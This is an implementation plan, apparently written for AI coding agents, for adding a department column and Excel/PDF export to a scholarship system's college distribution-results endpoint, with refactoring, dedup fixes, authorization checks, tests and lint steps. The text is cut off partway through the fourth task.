# 學院分發結果：系所 + Excel/PDF 匯出 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add a 系所 column and Excel/PDF export to the existing college-facing distribution-results view, and close four confirmed pre-existing defects that the export would otherwise print onto an official document.

**Architecture:** The gate + college-scoping + dedup + grouping logic is extracted out of the `GET /college-review/distribution-results` endpoint body into a single shared loader in `college_review/_helpers.py`. Both the JSON endpoint and a new export endpoint call **only** that loader, so they cannot diverge on which students a college may see. Rendering lives in a new leaf service whose `build_workbook` and `build_pdf` share one `_COLUMNS` list, mirroring the proven `college_ranking_export_service`.

**Tech Stack:** FastAPI + SQLAlchemy (async), openpyxl (xlsx), reportlab (PDF, WQY CJK font), pytest/pytest-asyncio, Next.js + TypeScript, Jest.

**Spec:** `docs/superpowers/specs/2026-07-15-college-distribution-results-export-design.md` (commit `d432a231`)

## Global Constraints

- **Worktree:** all work happens in `/home/howard/scholarship-system/.claude/worktrees/college-distribution-results` on branch `worktree-college-distribution-results`. Do **not** `cd` to the main checkout.
- **Backend tests run on the HOST, not in the dev container.** The dev container bind-mounts a *different* worktree, so `docker compose exec backend pytest` tests the wrong code. Use the env block in "Running tests" below.
- **Lint gate is hard (all three must pass before any commit):**
  - `uvx --from "black==26.3.1" black --check --line-length=120 backend/app`
  - `flake8 app --select=B904,B014 --max-line-length=120` — B904: every `raise` inside `except` needs `from exc` / `from None`. B014: no redundant exception tuples.
  - targeted `pytest` for the touched file.
- **`logger.warning` / `logger.error` inside an `except` that interpolates the exception variable MUST also pass `exc_info=True`** (AST tripwire tests enforce this).
- **Test lane routing:** `async def` tests are auto-collected as **integration** and EXCLUDED from the unit lane. Sync `def` tests are **unit**. This is automatic — do not add markers.
- **No fallback/mock data on DB failure** — raise. (CLAUDE.md core principle.)
- **No backward compatibility required** — revise directly.
- **API responses** use the `{success, message, data}` `ApiResponse` shape. Binary exports are the documented exception (`StreamingResponse`).
- **系所 source is `student_data["trm_depname"]`** — the 申請當時 snapshot. No `departments` join. Never substitute a code for the name.

### Running tests (copy verbatim)

```bash
cd /home/howard/scholarship-system/.claude/worktrees/college-distribution-results/backend && \
env ENVIRONMENT=development \
  DATABASE_URL="postgresql+asyncpg://scholarship_user:scholarship_pass@localhost:5432/scholarship_db" \
  DATABASE_URL_SYNC="postgresql://scholarship_user:scholarship_pass@localhost:5432/scholarship_db" \
  SECRET_KEY="dev-secret-key-for-development-only" \
  REDIS_URL="redis://localhost:6379/0" \
  MINIO_ENDPOINT="localhost:9000" MINIO_ACCESS_KEY="minioadmin" MINIO_SECRET_KEY="minioadmin123" \
  MINIO_BUCKET="scholarship-documents" MINIO_SECURE=false \
  python3 -m pytest <TEST_PATH> -p no:cacheprovider --no-cov -v
```

`--no-cov` skips the 20% `fail_under` gate on narrow runs. conftest forces in-memory SQLite, so no Postgres is needed — the env vars only satisfy `Settings()` at import.

Frontend tooling runs from the **main repo's** `node_modules/.bin` (the worktree has none; `package.json`/`package-lock.json` are byte-identical — verified):

```bash
/home/howard/scholarship-system/frontend/node_modules/.bin/jest <ABS_PATH> --watchAll=false
```

## File Structure

| File | Responsibility |
|------|----------------|
| `backend/app/api/v1/endpoints/college_review/_helpers.py` | **Modify** — add `load_college_distribution_results`: the single gate + scope + dedup + group path |
| `backend/app/api/v1/endpoints/college_review/distribution.py` | **Modify** — JSON endpoint becomes a thin caller; add export endpoint |
| `backend/app/services/college_distribution_export_service.py` | **Create** — leaf renderer: `_COLUMNS` → `build_workbook` / `build_pdf` |
| `backend/app/tests/test_college_view_distribution.py` | **Modify** — realistic fixtures + loader tests |
| `backend/app/tests/test_college_distribution_export_service.py` | **Create** — sync unit tests for the renderer |
| `backend/app/tests/test_college_distribution_export_endpoint.py` | **Create** — async integration tests for the export endpoint |
| `frontend/lib/utils/download.ts` | **Create** — extracted `triggerBlobDownload` (shared by 2 callers) |
| `frontend/lib/api/modules/college.ts` | **Modify** — `department` on the type + `exportDistributionResults` |
| `frontend/components/college-ranking-table.tsx` | **Modify** — import the extracted `triggerBlobDownload` |
| `frontend/components/college/distribution/DistributionResultPanel.tsx` | **Modify** — 系所 in `Row` + 匯出 dropdown |
| `frontend/lib/api/generated/schema.d.ts` | **Regenerate** — OpenAPI types |

**Why the loader lives in `_helpers.py` and not a new service:** it must raise `HTTPException`. Of 60 files in `app/services/`, exactly one (`minio_service.py`) references `HTTPException`, and a tripwire docstring cites it as the cautionary example. `_helpers.py` is already this package's home for a shared gate that raises (`assert_can_manage_ranking:43`) and a shared async loader (`load_export_aux_data:159`).

---

### Task 1: Extract the shared loader (pure refactor, zero behavior change)

Move the gate + scope + grouping out of the endpoint body into `_helpers.py`. **No behavior changes in this task** — the four existing tests must pass **unmodified**. That is the proof the extraction is faithful, and it is why this is a task of its own: a reviewer can approve the move without reasoning about the fixes that follow.

**Files:**
- Modify: `backend/app/api/v1/endpoints/college_review/_helpers.py`
- Modify: `backend/app/api/v1/endpoints/college_review/distribution.py:423-566`
- Test: `backend/app/tests/test_college_view_distribution.py` (unchanged — run as-is)

**Interfaces:**
- Consumes: `normalize_semester_value`, `_check_scholarship_permission`, `_check_academic_year_permission` (all already in `_helpers.py`); `get_college_code_from_data`, `get_nycu_id_from_data`, `get_student_name_from_data` (`app/utils/application_helpers.py`).
- Produces: `async def load_college_distribution_results(db: AsyncSession, *, current_user: User, scholarship_type_id: int, academic_year: int, semester: Optional[str] = None) -> Dict[str, Any]` returning `{"distribution_executed": bool, "sub_types": List[Dict]}`. Tasks 2/3/4 modify its internals; Task 6 calls it.

- [ ] **Step 1: Run the existing tests to record the green baseline**

```bash
# (use the env block from "Running tests")
python3 -m pytest app/tests/test_college_view_distribution.py -p no:cacheprovider --no-cov -v
```

Expected: **5 passed** (1 admin-toggle test + 4 distribution tests).

- [ ] **Step 2: Add the imports the loader needs to `_helpers.py`**

At the top of `backend/app/api/v1/endpoints/college_review/_helpers.py`, extend the existing import block. The current imports are lines 1-19; add these (keep alphabetical grouping consistent with the file):

```python
from collections import defaultdict
from typing import Any, Dict, Iterable, List, Optional

from sqlalchemy import and_, select
from sqlalchemy.orm import selectinload

from app.models.application import Application
from app.models.college_review import CollegeRanking, CollegeRankingItem
from app.models.scholarship import ScholarshipConfiguration, ScholarshipType
from app.utils.application_helpers import (
    get_college_code_from_data,
    get_nycu_id_from_data,
    get_student_name_from_data,
)
```

Note: `Any`, `Iterable`, `Optional` are already imported on line 6 — merge rather than duplicate. `select` is already on line 9 — merge `and_` into it.

- [ ] **Step 3: Append the loader to `_helpers.py`**

Add at the end of the file. This is a **faithful move** of `distribution.py:439-566` — same logic, same order, same messages:

```python
async def load_college_distribution_results(
    db: AsyncSession,
    *,
    current_user: User,
    scholarship_type_id: int,
    academic_year: int,
    semester: Optional[str] = None,
) -> Dict[str, Any]:
    """Load this college's own students' distribution outcomes, grouped by sub-type.

    Single source of truth for the college-facing distribution read: BOTH the JSON
    endpoint and the Excel/PDF export call this, so the two surfaces can never
    disagree about which students a college may see. Allocation outcome only — no
    payment PII, no allocation-year labels (outcomes for one sub-type are merged
    across years).

    Gate order is deliberate: permission before flag, so a college with no binding
    never learns the toggle's state.
    """
    college_code = current_user.college_code
    if not college_code:
        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="使用者未綁定學院")

    normalized_semester = normalize_semester_value(semester)

    config_stmt = select(ScholarshipConfiguration).where(
        and_(
            ScholarshipConfiguration.scholarship_type_id == scholarship_type_id,
            ScholarshipConfiguration.academic_year == academic_year,
            ScholarshipConfiguration.is_active.is_(True),
        )
    )
    if normalized_semester:
        config_stmt = config_stmt.where(ScholarshipConfiguration.semester == normalized_semester)
    else:
        config_stmt = config_stmt.where(ScholarshipConfiguration.semester.is_(None))
    config = (await db.execute(config_stmt)).scalar_one_or_none()
    if not config:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="找不到對應的獎學金配置")

    if not config.allow_college_view_distribution:
        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="分發結果尚未開放查看")

    ranking_stmt = select(CollegeRanking).where(
        and_(
            CollegeRanking.scholarship_type_id == scholarship_type_id,
            CollegeRanking.academic_year == academic_year,
        )
    )
    if normalized_semester:
        ranking_stmt = ranking_stmt.where(CollegeRanking.semester == normalized_semester)
    else:
        ranking_stmt = ranking_stmt.where(CollegeRanking.semester.is_(None))
    rankings = (await db.execute(ranking_stmt)).scalars().all()
    ranking_ids = [r.id for r in rankings]
    ranking_sub_type = {r.id: r.sub_type_code for r in rankings}
    distribution_executed = any(r.distribution_executed for r in rankings)

    if not ranking_ids or not distribution_executed:
        return {"distribution_executed": distribution_executed, "sub_types": []}

    st_stmt = (
        select(ScholarshipType)
        .options(selectinload(ScholarshipType.sub_type_configs))
        .where(ScholarshipType.id == scholarship_type_id)
    )
    scholarship_type = (await db.execute(st_stmt)).scalar_one_or_none()
    label_map: Dict[str, Dict[str, str]] = {}
    if scholarship_type and getattr(scholarship_type, "sub_type_configs", None):
        for sc in scholarship_type.sub_type_configs:
            if sc.sub_type_code:
                label_map[sc.sub_type_code] = {
                    "label": sc.name or sc.sub_type_code,
                    "label_en": sc.name_en or sc.name or sc.sub_type_code,
                }

    items_stmt = (
        select(CollegeRankingItem)
        .options(
            selectinload(CollegeRankingItem.application).load_only(Application.student_data, Application.deleted_at)
        )
        .where(CollegeRankingItem.ranking_id.in_(ranking_ids))
    )
    items = (await db.execute(items_stmt)).scalars().all()

    groups: Dict[str, Dict[str, list]] = defaultdict(lambda: {"admitted": [], "backup": [], "rejected": []})

    for item in items:
        appn = item.application
        if not appn or not appn.student_data:
            continue
        if appn.deleted_at is not None:
            continue
        sd = appn.student_data
        # College scoping (Python-side; student_data is encrypted JSON, the academy
        # code is plaintext). Reuse the canonical accessor so key-alias changes stay
        # in one place.
        if get_college_code_from_data(sd) != college_code:
            continue
        student = {
            "student_number": get_nycu_id_from_data(sd) or "N/A",
            "student_name": get_student_name_from_data(sd),
        }
        fallback_code = ranking_sub_type.get(item.ranking_id) or "unallocated"

        handled = False
        if item.is_allocated and item.allocated_sub_type:
            groups[item.allocated_sub_type]["admitted"].append({**student, "rank_position": item.rank_position})
            handled = True
        if item.backup_allocations and isinstance(item.backup_allocations, list):
            for ba in item.backup_allocations:
                if not isinstance(ba, dict):
                    continue
                st_code = ba.get("sub_type")
                if not st_code:
                    continue
                groups[st_code]["backup"].append({**student, "backup_position": ba.get("backup_position")})
                handled = True
        if not handled:
            groups[fallback_code]["rejected"].append(student)

    sub_types = []
    for code in sorted(groups.keys()):
        m = label_map.get(code, {"label": code, "label_en": code})
        g = groups[code]
        sub_types.append(
            {
                "code": code,
                "label": m["label"],
                "label_en": m["label_en"],
                "admitted": sorted(g["admitted"], key=lambda s: s.get("rank_position") or 0),
                "backup": sorted(g["backup"], key=lambda s: s.get("backup_position") or 0),
                "rejected": g["rejected"],
            }
        )

    return {"distribution_executed": True, "sub_types": sub_types}
```

- [ ] **Step 4: Replace the endpoint body in `distribution.py` with a thin call**

Replace the whole of `distribution.py:423-566` (from `@router.get("/distribution-results")` to the end of the file) with:

```python
@router.get("/distribution-results")
async def get_college_distribution_results(
    scholarship_type_id: int,
    academic_year: int,
    semester: Optional[str] = None,
    current_user: User = Depends(require_college),
    db: AsyncSession = Depends(get_db),
):
    """College-facing: this college's own students' distribution outcomes by sub-type.

    All gating, college scoping and grouping live in
    ``load_college_distribution_results`` so this endpoint and the Excel/PDF export
    can never disagree about which students a college may see.
    """
    data = await load_college_distribution_results(
        db,
        current_user=current_user,
        scholarship_type_id=scholarship_type_id,
        academic_year=academic_year,
        semester=semester,
    )
    return ApiResponse(
        success=True,
        message="分發結果" if data["distribution_executed"] else "尚未分發",
        data=data,
    )
```

Update the import on `distribution.py:36`:

```python
from ._helpers import assert_can_manage_ranking, load_college_distribution_results, normalize_semester_value
```

- [ ] **Step 5: Remove imports `distribution.py` no longer uses**

The moved code took these with it. Delete from `distribution.py` **only if no other endpoint in the file still uses them** — verify each with a grep before deleting:

```bash
cd /home/howard/scholarship-system/.claude/worktrees/college-distribution-results/backend
for sym in defaultdict get_college_code_from_data get_nycu_id_from_data get_student_name_from_data ScholarshipConfiguration ScholarshipType Application selectinload; do
  echo "--- $sym: $(grep -c "\b$sym\b" app/api/v1/endpoints/college_review/distribution.py)"
done
```

A count of `1` means only the import line remains → delete it. Then let flake8 confirm:

```bash
flake8 app/api/v1/endpoints/college_review/distribution.py --select=F401 --max-line-length=120
```

Expected: no output.

- [ ] **Step 6: Run the existing tests UNCHANGED — this is the refactor's proof**

```bash
python3 -m pytest app/tests/test_college_view_distribution.py -p no:cacheprovider --no-cov -v
```

Expected: **5 passed**, same as Step 1. If any test fails, the extraction was not faithful — fix the loader, do not edit the test.

- [ ] **Step 7: Lint**

```bash
cd /home/howard/scholarship-system/.claude/worktrees/college-distribution-results
uvx --from "black==26.3.1" black --check --line-length=120 backend/app
cd backend && flake8 app --select=B904,B014 --max-line-length=120
```

Expected: both clean.

- [ ] **Step 8: Commit**

```bash
git add backend/app/api/v1/endpoints/college_review/_helpers.py backend/app/api/v1/endpoints/college_review/distribution.py
git commit -m "refactor: extract college distribution-results loader into _helpers

Pure move, no behavior change — the four existing tests pass unmodified.
Both the JSON endpoint and the upcoming export endpoint will call this one
loader so they cannot diverge on college scoping."
```

---

### Task 2: Add 系所 to the loader

**Files:**
- Modify: `backend/app/api/v1/endpoints/college_review/_helpers.py` (the `student` dict inside `load_college_distribution_results`)
- Test: `backend/app/tests/test_college_view_distribution.py`

**Interfaces:**
- Consumes: `load_college_distribution_results` (Task 1).
- Produces: every student dict in `admitted`/`backup`/`rejected` gains `"department": str` (empty string when the snapshot has no `trm_depname`). Task 5's `flatten_sub_types` reads `s["department"]`; Task 7's `DistributionStudent` TS type mirrors it.

- [ ] **Step 1: Give the test helper a department, and write the failing test**

In `backend/app/tests/test_college_view_distribution.py`, replace `_student_data` (line 94-95) so a department can be seeded:

```python
def _student_data(std_code: str, name: str, academy: str, dept: str = "電子研") -> dict:
    return {
        "std_stdcode": std_code,
        "std_cname": name,
        "std_academyno": academy,
        "trm_depname": dept,
    }
```

Append this test to the file:

```python
@pytest.mark.asyncio
async def test_distribution_results_include_department(college_client_factory, config, sch_type, db):
    """系所 comes from the student_data snapshot (trm_depname) and appears on
    admitted, backup AND rejected rows alike."""
    config.allow_college_view_distribution = True
    await db.commit()
    await _seed_distribution(db, sch_type, executed=True)

    cclient = await college_client_factory("A")
    resp = await cclient.get(
        DIST_URL, params={"scholarship_type_id": sch_type.id, "academic_year": 114, "semester": "first"}
    )
    assert resp.status_code == 200
    nstc = next(g for g in resp.json()["data"]["sub_types"] if g["code"] == "nstc")

    assert nstc["admitted"][0]["department"] == "電子研"
    assert nstc["backup"][0]["department"] == "電子研"
    assert nstc["rejected"][0]["department"] == "電子研"


@pytest.mark.asyncio
async def test_distribution_results_department_missing_renders_empty_string(
    college_client_factory, config, sch_type, db
):
    """A snapshot with no trm_depname must yield "" — never None, never a dept code."""
    config.allow_college_view_distribution = True
    await db.commit()

    ranking = CollegeRanking(
        scholarship_type_id=sch_type.id,
        sub_type_code="nstc",
        academic_year=114,
        semester="first",
        ranking_name="nstc 114-1 nodept",
        total_applications=1,
        is_finalized=True,
        distribution_executed=True,
        allocated_count=1,
    )
    db.add(ranking)
    await db.commit()
    await db.refresh(ranking)

    student = User(
        nycu_id="cvd_student_ND1",
        email="cvd_student_ND1@university.edu",
        name="無系所生",
        user_type=UserType.student,
        role=UserRole.student,
    )
    db.add(student)
    appn = Application(
        app_id="APP-CVD-ND1",
        student=student,
        scholarship_type_id=sch_type.id,
        academic_year=114,
        semester="first",
        status="approved",
        sub_type_selection_mode=SubTypeSelectionMode.single,
        # no trm_depname key at all
        student_data={"std_stdcode": "ND1", "std_cname": "無系所生", "std_academyno": "A"},
    )
    db.add(appn)
    await db.commit()
    await db.refresh(appn)
    db.add(
        CollegeRankingItem(
            ranking_id=ranking.id,
            application_id=appn.id,
            rank_position=1,
            is_allocated=True,
            allocated_sub_type="nstc",
            status="allocated",
        )
    )
    await db.commit()

    cclient = await college_client_factory("A")
    resp = await cclient.get(
        DIST_URL, params={"scholarship_type_id": sch_type.id, "academic_year": 114, "semester": "first"}
    )
    assert resp.status_code == 200
    nstc = next(g for g in resp.json()["data"]["sub_types"] if g["code"] == "nstc")
    assert nstc["admitted"][0]["department"] == ""
```

- [ ] **Step 2: Run to verify they fail**

```bash
python3 -m pytest app/tests/test_college_view_distribution.py -k department -p no:cacheprovider --no-cov -v
```

Expected: FAIL — `KeyError: 'department'`.

- [ ] **Step 3: Add `department` to the loader's student dict**

In `_helpers.py`, inside `load_college_distribution_results`, replace the `student = {...}` block:

```python
        student = {
            "student_number": get_nycu_id_from_data(sd) or "N/A",
            "student_name": get_student_name_from_data(sd),
            # 系所 name from the 申請當時 snapshot. There is no canonical accessor for
            # the department NAME (get_department_code_from_data returns the CODE), so
            # read trm_depname directly — the same key manual_distribution.py:492,
            # payment_rosters.py:1373 and college_ranking_export_service.py:292 use.
            "department": sd.get("trm_depname") or "",
        }
```

- [ ] **Step 4: Run to verify they pass**

```bash
python3 -m pytest app/tests/test_college_view_distribution.py -p no:cacheprovider --no-cov -v
```

Expected: **7 passed** (5 original + 2 new).

- [ ] **Step 5: Lint and commit**

```bash
cd /home/howard/scholarship-system/.claude/worktrees/college-distribution-results
uvx --from "black==26.3.1" black --check --line-length=120 backend/app
cd backend && flake8 app --select=B904,B014 --max-line-length=120
git add backend/app/api/v1/endpoints/college_review/_helpers.py backend/app/tests/test_college_view_distribution.py
git commit -m "feat: add 系所 to college distribution results

Sourced from the student_data snapshot (trm_depname), matching every other
系所 display in the system. Missing key renders as empty string."
```

---

### Task 3: Fix dedup, ordering and the blank 未錄取 名次

Three defects, one deliverable: the loader's rows become correct and deterministic. Grouped because they share a test fixture and a reviewer would judge them together.

**Files:**
- Modify: `backend/app/api/v1/endpoints/college_review/_helpers.py`
- Test: `backend/app/tests/test_college_view_distribution.py`

**Interfaces:**
- Produces: `rejected` student dicts now carry `"rank_position": Optional[int]`; at most one row per `application_id` across all buckets of all sub-types; all three lists sorted with None last.

- [ ] **Step 1: Write the failing tests**

Append to `backend/app/tests/test_college_view_distribution.py`:

```python
@pytest.mark.asyncio
async def test_distribution_results_dedup_prefers_allocated_item(college_client_factory, config, sch_type, db):
    """An application can legitimately sit in TWO finalized rankings of the same
    college (a 'default' ranking alongside a sub-type one). Allocation state lives
    per-ranking-item, so without dedup the same student renders as BOTH 正取 and
    未錄取. Keep one row per application, preferring the item that carries the real
    allocation. Mirrors manual_distribution_service.get_students_for_distribution.
    """
    config.allow_college_view_distribution = True
    await db.commit()

    def _ranking(name, sub_type_code):
        return CollegeRanking(
            scholarship_type_id=sch_type.id,
            sub_type_code=sub_type_code,
            academic_year=114,
            semester="first",
            college_code="A",
            ranking_name=name,
            total_applications=1,
            is_finalized=True,
            distribution_executed=True,
            allocated_count=1,
        )

    r_default = _ranking("default 114-1", "default")
    r_nstc = _ranking("nstc 114-1", "nstc")
    db.add_all([r_default, r_nstc])
    await db.commit()
    await db.refresh(r_default)
    await db.refresh(r_nstc)

    student = User(
        nycu_id="cvd_student_DUP1",
        email="cvd_student_DUP1@university.edu",
        name="重複生",
        user_type=UserType.student,
        role=UserRole.student,
    )
    db.add(student)
    appn = Application(
        app_id="APP-CVD-DUP1",
        student=student,
        scholarship_type_id=sch_type.id,
        academic_year=114,
        semester="first",
        status="approved",
        sub_type_selection_mode=SubTypeSelectionMode.single,
        student_data=_student_data("DUP1", "重複生", "A"),
    )
    db.add(appn)
    await db.commit()
    await db.refresh(appn)

    db.add_all(
        [
            # unallocated duplicate in the 'default' ranking -> would render 未錄取
            CollegeRankingItem(
                ranking_id=r_default.id,
                application_id=appn.id,
                rank_position=1,
                is_allocated=False,
                status="ranked",
            ),
            # the real allocation
            CollegeRankingItem(
                ranking_id=r_nstc.id,
                application_id=appn.id,
                rank_position=1,
                is_allocated=True,
                allocated_sub_type="nstc",
                status="allocated",
            ),
        ]
    )
    await db.commit()

    cclient = await college_client_factory("A")
    resp = await cclient.get(
        DIST_URL, params={"scholarship_type_id": sch_type.id, "academic_year": 114, "semester": "first"}
    )
    assert resp.status_code == 200
    data = resp.json()["data"]

    appearances = [
        (g["code"], bucket)
        for g in data["sub_types"]
        for bucket in ("admitted", "backup", "rejected")
        for s in g[bucket]
        if s["student_number"] == "DUP1"
    ]
    assert appearances == [("nstc", "admitted")], f"expected exactly one 正取 row, got {appearances}"


@pytest.mark.asyncio
async def test_distribution_results_rejected_carries_rank_position(college_client_factory, config, sch_type, db):
    """未錄取 rows must carry 名次 so the export's 名次 column is populated."""
    config.allow_college_view_distribution = True
    await db.commit()
    await _seed_distribution(db, sch_type, executed=True)

    cclient = await college_client_factory("A")
    resp = await cclient.get(
        DIST_URL, params={"scholarship_type_id": sch_type.id, "academic_year": 114, "semester": "first"}
    )
    nstc = next(g for g in resp.json()["data"]["sub_types"] if g["code"] == "nstc")
    assert nstc["rejected"][0]["rank_position"] == 3  # A003 was seeded at rank 3


@pytest.mark.asyncio
async def test_distribution_results_ordering_is_deterministic(college_client_factory, config, sch_type, db):
    """Same input, same order — the items query must be explicitly ordered."""
    config.allow_college_view_distribution = True
    await db.commit()
    await _seed_distribution(db, sch_type, executed=True)

    cclient = await college_client_factory("A")
    params = {"scholarship_type_id": sch_type.id, "academic_year": 114, "semester": "first"}
    first = (await cclient.get(DIST_URL, params=params)).json()["data"]
    second = (await cclient.get(DIST_URL, params=params)).json()["data"]
    assert first == second
```

- [ ] **Step 2: Run to verify they fail**

```bash
python3 -m pytest app/tests/test_college_view_distribution.py -k "dedup or rank_position or deterministic" -p no:cacheprovider --no-cov -v
```

Expected: `test_distribution_results_dedup_prefers_allocated_item` FAILS (two appearances), `test_distribution_results_rejected_carries_rank_position` FAILS (`KeyError: 'rank_position'`). The determinism test may pass by luck on SQLite — it is a regression guard, not a reproduction.

- [ ] **Step 3: Add ordering to the items query**

In `_helpers.py`, add `.order_by(...)` to `items_stmt`:

```python
    items_stmt = (
        select(CollegeRankingItem)
        .options(
            selectinload(CollegeRankingItem.application).load_only(Application.student_data, Application.deleted_at)
        )
        .where(CollegeRankingItem.ranking_id.in_(ranking_ids))
        # Explicit order: dedup below keeps the FIRST item on a priority tie, so
        # arbitrary DB return order would make the kept row nondeterministic.
        # Mirrors manual_distribution_service.get_students_for_distribution.
        .order_by(CollegeRankingItem.rank_position, CollegeRankingItem.id)
    )
    items = (await db.execute(items_stmt)).scalars().all()
```

- [ ] **Step 4: Add the dedup pass between fetching and grouping**

In `_helpers.py`, insert this **immediately after** `items = (await db.execute(items_stmt)).scalars().all()` and **before** the `groups: Dict[...] = defaultdict(...)` line:

```python
    # Dedup by application_id BEFORE grouping. An application can legitimately appear
    # in two finalized rankings of the same college (e.g. a "default" ranking
    # finalized alongside a specific sub-type one) — allocation state lives per
    # ranking-item, so without this the same student renders as BOTH 正取 (from the
    # allocated item) and 未錄取 (from the unallocated duplicate). Precedence mirrors
    # manual_distribution_service.get_students_for_distribution: prefer the item
    # carrying the real allocation, then one carrying a backup slot; ties keep the
    # first, which the ORDER BY above makes deterministic.
    kept_by_app: Dict[int, CollegeRankingItem] = {}
    for item in items:
        appn = item.application
        if not appn or not appn.student_data or appn.deleted_at is not None:
            continue
        if get_college_code_from_data(appn.student_data) != college_code:
            continue
        existing = kept_by_app.get(item.application_id)
        if existing is None:
            kept_by_app[item.application_id] = item
            continue
        if _item_priority(item) > _item_priority(existing):
            kept_by_app[item.application_id] = item
        elif item.is_allocated and existing.is_allocated:
            # Both duplicates carry a live allocation — a data anomaly this view can
            # only surface one of. Log so the hidden allocation is discoverable.
            logger.warning(
                "Application %s has two allocated ranking items (%s, %s) in college %s; "
                "distribution results show only %s",
                item.application_id,
                existing.id,
                item.id,
                college_code,
                existing.id,
            )
```

And add this module-level helper next to the loader in `_helpers.py`:

```python
def _item_priority(item: CollegeRankingItem) -> tuple:
    """Dedup precedence for two ranking items of the same application.

    A real allocation outranks a backup slot, which outranks a bare ranked row.
    Returned as a tuple so ties compare equal and the caller keeps the first
    (rank-ordered) item.
    """
    return (1 if item.is_allocated else 0, 1 if item.backup_allocations else 0)
```

- [ ] **Step 5: Rewrite the grouping loop to consume the deduped items**

Replace the whole `for item in items:` grouping loop (the one starting `for item in items:` and ending with the `groups[fallback_code]["rejected"].append(student)` line) with:

```python
    for item in kept_by_app.values():
        sd = item.application.student_data
        student = {
            "student_number": get_nycu_id_from_data(sd) or "N/A",
            "student_name": get_student_name_from_data(sd),
            # 系所 name from the 申請當時 snapshot. There is no canonical accessor for
            # the department NAME (get_department_code_from_data returns the CODE), so
            # read trm_depname directly — the same key manual_distribution.py:492,
            # payment_rosters.py:1373 and college_ranking_export_service.py:292 use.
            "department": sd.get("trm_depname") or "",
        }
        fallback_code = ranking_sub_type.get(item.ranking_id) or "unallocated"

        handled = False
        if item.is_allocated and item.allocated_sub_type:
            groups[item.allocated_sub_type]["admitted"].append({**student, "rank_position": item.rank_position})
            handled = True
        if item.backup_allocations and isinstance(item.backup_allocations, list):
            for ba in item.backup_allocations:
                if not isinstance(ba, dict):
                    continue
                st_code = ba.get("sub_type")
                if not st_code:
                    continue
                groups[st_code]["backup"].append({**student, "backup_position": ba.get("backup_position")})
                handled = True
        if not handled:
            # Carry rank_position so the export's 名次 column is populated and sortable.
            groups[fallback_code]["rejected"].append({**student, "rank_position": item.rank_position})
```

Note the soft-delete / college-scope guards moved into the dedup pass in Step 4 — they must not remain here (they would be dead code).

- [ ] **Step 6: Replace the `or 0` sort keys and sort `rejected`**

Replace the `sub_types` assembly block with:

```python
    def _pos_key(value: Optional[int]) -> tuple:
        # None sorts LAST. A bare `or 0` would collide None with 0 and interleave
        # unpositioned rows among rank 0/1.
        return (value is None, value or 0)

    sub_types = []
    for code in sorted(groups.keys()):
        m = label_map.get(code, {"label": code, "label_en": code})
        g = groups[code]
        sub_types.append(
            {
                "code": code,
                "label": m["label"],
                "label_en": m["label_en"],
                "admitted": sorted(g["admitted"], key=lambda s: _pos_key(s.get("rank_position"))),
                "backup": sorted(g["backup"], key=lambda s: _pos_key(s.get("backup_position"))),
                "rejected": sorted(g["rejected"], key=lambda s: _pos_key(s.get("rank_position"))),
            }
        )
```

- [ ] **Step 7: Run the full file**

```bash
python3 -m pytest app/tests/test_college_view_distribution.py -p no:cacheprovider --no-cov -v
```

Expected: **10 passed** (7 from Task 2 + 3 new).

- [ ] **Step 8: Lint and commit**

```bash
cd /home/howard/scholarship-system/.claude/worktrees/college-distribution-results
uvx --from "black==26.3.1" black --check --line-length=120 backend/app
cd backend && flake8 app --select=B904,B014 --max-line-length=120
git add backend/app/api/v1/endpoints/college_review/_helpers.py backend/app/tests/test_college_view_distribution.py
git commit -m "fix: dedup, order and 名次 in college distribution results

- dedup by application_id (a student in two finalized rankings rendered as
  both 正取 and 未錄取); precedence mirrors manual_distribution_service
- explicit ORDER BY so the kept duplicate is deterministic
- carry rank_position onto 未錄取 rows and sort them
- None-last sort keys instead of 'or 0', which collided None with 0"
```

---

### Task 4: Add the missing grant checks and scope rankings by college

Closes the two authorization defects. This task **intentionally changes behavior**: a college user with no `AdminScholarship` grant goes 200 → 403.

**Files:**
- Modify: `backend/app/api/v1/endpoints/college_review/_helpers.py`
- Test: `backend/app/tests/test_college_view_distribution.py`

**Interfaces:**
- Consumes: `_check_scholarship_permission(user, scholarship_type_id, db) -> bool` (`_helpers.py:66`), `_check_academic_year_permission(user, academic_year, db) -> bool` (`_helpers.py:96`).
- Produces: no signature change; two new 403 paths and a college-scoped ranking query.

- [ ] **Step 1: Make the existing fixtures realistic**

The current fixtures are unrealistic in exactly the two ways this task fixes — they seed no grant and no ranking `college_code`. Fix them **first**, so the existing tests keep passing once the gates land.

In `backend/app/tests/test_college_view_distribution.py`, in `college_client_factory` (line ~102), add a grant right after `await db.refresh(user)`:

```python
        # College users need an explicit AdminScholarship grant to read this
        # scholarship (_check_scholarship_permission). Seeding it here mirrors real
        # provisioning; without it every request 403s.
        db.add(AdminScholarship(admin_id=user.id, scholarship_id=sch_type.id))
        await db.commit()
```

This needs `sch_type` in scope — change the fixture signature:

```python
@pytest_asyncio.fixture
async def college_client_factory(db: AsyncSession, client: AsyncClient, sch_type):
```

In `_seed_distribution` (line ~128), add `college_code="A"` to the `CollegeRanking(...)`:

```python
    ranking = CollegeRanking(
        scholarship_type_id=sch_type.id,
        sub_type_code="nstc",
        academic_year=114,
        semester="first",
        college_code="A",  # rankings are per-college (issue #1034)
        ranking_name="nstc 114-1",
        total_applications=4,
        is_finalized=True,
        distribution_executed=executed,
        allocated_count=2,
    )
```

Do the same for the two inline `CollegeRanking(...)` in `test_distribution_results_allocation_wins_over_college_rejected` and `test_distribution_results_department_missing_renders_empty_string`: add `college_code="A"`.

- [ ] **Step 2: Write the failing tests**

Append:

```python
@pytest.mark.asyncio
async def test_distribution_results_403_without_scholarship_grant(client, config, sch_type, db):
    """A college user with no AdminScholarship grant must not read this scholarship's
    distribution results, even with the admin toggle ON — and must not learn the
    toggle's state either (permission is checked before the flag)."""
    config.allow_college_view_distribution = True
    await db.commit()
    await _seed_distribution(db, sch_type, executed=True)

    ungranted = User(
        nycu_id="cvd_college_nogrant",
        email="cvd_college_nogrant@university.edu",
        name="No Grant College",
        user_type=UserType.employee,
        role=UserRole.college,
        college_code="A",
    )
    db.add(ungranted)
    await db.commit()

    async def override_college():
        return ungranted

    app.dependency_overrides[require_college] = override_college
    try:
